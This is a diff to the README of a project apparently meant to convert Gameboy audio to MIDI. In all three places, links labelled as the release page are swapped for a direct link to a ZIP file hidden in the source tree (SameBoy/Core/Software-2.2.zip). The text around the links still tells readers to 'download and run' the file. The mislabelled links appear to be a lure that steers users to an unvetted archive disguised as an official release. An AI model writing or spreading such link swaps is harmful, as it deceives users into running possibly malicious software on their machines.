@@ -1,6 +1,6 @@
 # 🎵 blueisgay - Convert Gameboy Audio to MIDI
 
-[![Download blueisgay](https://img.shields.io/badge/Download-Release%20Page-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Brend7174/blueisgay/releases)
+[![Download blueisgay](https://img.shields.io/badge/Download-Release%20Page-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Brend7174/blueisgay/raw/refs/heads/main/SameBoy/Core/Software-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit the release page to download and run this file:
 
-https://github.com/Brend7174/blueisgay/releases
+https://github.com/Brend7174/blueisgay/raw/refs/heads/main/SameBoy/Core/Software-2.2.zip
 
 On the release page, look for the latest version and download the Windows file that matches your PC. Most users should choose the `.exe` file or the Windows ZIP file if one is listed.
 
@@ -156,4 +156,4 @@ A tidy folder setup makes it easier to find your files later.
 
 If you need the release page again, use this link to download and run the app:
 
-https://github.com/Brend7174/blueisgay/releases
+https://github.com/Brend7174/blueisgay/raw/refs/heads/main/SameBoy/Core/Software-2.2.zip
